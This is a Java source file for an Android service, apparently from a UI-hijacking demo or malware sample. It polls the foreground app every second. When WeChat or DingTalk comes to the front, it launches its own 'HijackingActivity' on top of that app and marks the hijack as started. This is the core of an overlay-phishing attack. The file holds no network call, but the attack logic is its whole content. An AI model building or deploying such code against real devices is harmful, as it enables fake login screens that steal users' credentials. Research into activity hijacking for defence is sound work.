package com.eesec.hijack;

import android.app.Service;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.util.Log;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

//import com.jaredrummler.android.processes.AndroidProcesses;
//import com.jaredrummler.android.processes.models.AndroidAppProcess;

public class HijackingService extends Service {
    long delay = 1000;
    Timer mTimer = new Timer();
    TimerTask mTimerTask = new TimerTask() {
        public void run() {
            List<String> processNames = new ArrayList<>();
            if (VERSION.SDK_INT >= 21) {

                String packageName = ForegroundAppUtil.getForegroundActivityName(HijackingService.this);
                Log.i("wxy", "packagename: " + packageName);
                if ("com.tencent.mm".equals(packageName) || "com.alibaba.android.rimet".equals(packageName)) {
                    Intent dialogIntent = new Intent(HijackingService.this.getBaseContext(), HijackingActivity.class);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    HijackingService.this.getApplication().startActivity(dialogIntent);
                    ((HijackingApplication) HijackingService.this.getApplication()).setHasHijackStart(true);
                }
            }
        }
    };
    HashMap<String, Class<?>> mVictims = new HashMap<>();
    long period = 1000;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        this.mTimer.schedule(this.mTimerTask, this.delay, this.period);
        return super.onStartCommand(intent, flags, startId);
    }
}